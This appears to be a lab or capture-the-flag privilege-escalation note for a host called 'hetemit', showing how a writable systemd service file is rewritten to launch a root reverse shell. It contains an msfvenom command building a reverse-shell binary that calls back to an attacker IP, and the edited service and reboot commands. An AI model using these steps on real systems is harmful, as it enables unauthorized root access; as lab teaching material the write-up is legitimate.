---
description: Root access with writable services.
---

# Writable services

```
[cmeeks@hetemit ~]$ sudo -l

User cmeeks may run the following commands on hetemit:
    (root) NOPASSWD: /sbin/halt, /sbin/reboot, /sbin/poweroff

You have write privileges over /etc/systemd/system/pythonapp.service
```

The most important parameters here are :&#x20;

• User : The user that the service will run as.

• Execstart : It specifies the command that will run when the service starts.

Now we want to get shell as root. There are many ways to do so with systemd services.

```
[cmeeks@hetemit ~]$ cat /etc/systemd/system/pythonapp.service
[Unit]
Description=Python App
After=network-online.target

[Service]
Type=simple
WorkingDirectory=/home/cmeeks/restjson_hetemit
ExecStart=flask run -h 0.0.0.0 -p 50000
TimeoutSec=30
RestartSec=15s
User=cmeeks
ExecReload=/bin/kill -USR1 $MAINPID
Restart=on-failure

[Install]
WantedBy=multi-user.target
```

```
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.49.179 LPORT=80 -f elf -o reverse.elf
```

```
[cmeeks@hetemit ~]$ echo "
[Unit]
Description=Python App
After=network-online.target

[Service]
Type=simple
WorkingDirectory=/home/cmeeks/restjson_hetemit
ExecStart=/tmp/reverse.elf
TimeoutSec=30
RestartSec=15s
User=root
ExecReload=/bin/kill -USR1 $MAINPID
Restart=on-failure

[Install]
WantedBy=multi-user.target
" > /etc/systemd/system/pythonapp.service

[cmeeks@hetemit ~]$ sudo reboot --reboot -f
```
